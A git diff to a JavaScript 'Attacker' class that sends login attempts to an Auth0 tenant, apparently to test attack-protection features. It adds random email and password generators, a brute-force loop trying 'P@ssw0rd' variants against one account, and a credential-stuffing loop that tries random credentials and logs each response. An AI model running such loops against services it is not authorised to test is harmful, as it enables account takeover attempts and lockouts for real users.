@@ -13,6 +13,86 @@ class Attacker {
   get client () { return this._client }
   get URL () { return `https://${process.env.AUTH0_DOMAIN}` }
 
+  /**
+   * Randomly generate an email address
+   */
+  static generateEmail () {
+    const addresses = [
+      'funny',
+      'phoney',
+      'munny',
+      'stealth',
+      'user',
+      'fake',
+      'not-real',
+      'unreal',
+      'psuedo',
+      'dude',
+      'dudette',
+      'thor',
+      'wonder',
+      'blunder',
+      'prof',
+      'nob',
+      'n00b',
+      'crypto',
+      'genius',
+      'guy',
+      'gal',
+      'new',
+      'old',
+      'hot',
+      'cold'
+    ]
+    const domains = [ 'org', 'ru', 'eu', 'edu', 'ca', 'com' ]
+    
+    const i = Math.floor(Math.random() * addresses.length)
+    const j = Math.floor(Math.random() * addresses.length)
+    const k = Math.floor(Math.random() * addresses.length)
+    const l = Math.floor(Math.random() * domains.length)
+
+    return `${addresses[i]}.${addresses[j]}@${addresses[k]}.${domains[l]}`
+  }
+
+  /**
+   * Randomly generate a password with the given strength and length
+   * 
+   * @param {object} param
+   * @param {string} param.strength A string describing the password strength
+   * @param {number} param.length   The minimum number of characters of the password
+   */
+  static generatePassword ({ strength = 'good', length = 8 }) {
+    const alpha = 'abcdefghijklmnopqrstuvwxyz'
+    const chars = '!@#$%^&*'
+    const lengthVariation = Math.floor(Math.random() * 4)
+    let password = []
+    for (let idx = 0; idx < length - 2 + lengthVariation; idx++) {
+      password[idx] = alpha[Math.floor(Math.random() * alpha.length)]
+      if (idx > length / 2) {
+        password[password.length - 1] = password[password.length - 1].toUpperCase()
+      }
+    }
+    password[password.length] = chars[Math.floor(Math.random() * chars.length)]
+    password[password.length] = chars[Math.floor(Math.random() * chars.length)]
+
+    shuffle(password)
+    return password.join('')
+
+    // Fisher-Yates Shuffle algorithm
+    // See ... https://bost.ocks.org/mike/shuffle/
+    function shuffle(array) {
+      let m = array.length
+      let t
+      let i
+      while (m) {
+        i = Math.floor(Math.random() * m--)
+        t = array[m]
+        array[m] = array[i]
+        array[i] = t
+      }
+    }
+  }
+
   async attemptLogin (email, password) {
     try {
       // SEE docs on "realm support"
@@ -57,9 +137,21 @@ class Attacker {
     }
   }
 
-  async credentialStuffing ({ email, attempts }) {
+  async bruteForce ({ email, attempts }) {
     for (let i = 0; i < attempts; i++) {
       const password = `P@ssw0rd${i}!`
+      const status = await this.attemptLogin(email, password)
+      console.log(`attempt #${i + 1} - email= ${chalk.blueBright(email)}, PW= ${chalk.blueBright(password)}: ${this.prettifyResponse(status)}`)
+    }
+  }
+
+  async credentialStuffing ({ attempts }) {
+    for (let i = 0; i < attempts; i++) {
+      const email = Attacker.generateEmail()
+      const password = Attacker.generatePassword({
+        strength: this.connection?.options?.password_policy || 'good',
+        length: this.connection?.options?.password_complexity_options?.min_length || 8
+      })
       const status = await this.attemptLogin(email, password)
       console.log(`attempt #${i + 1} - email= ${chalk.blueBright(email)}, PW= ${chalk.blueBright(password)}: ${this.prettifyResponse(status)}`)
     }
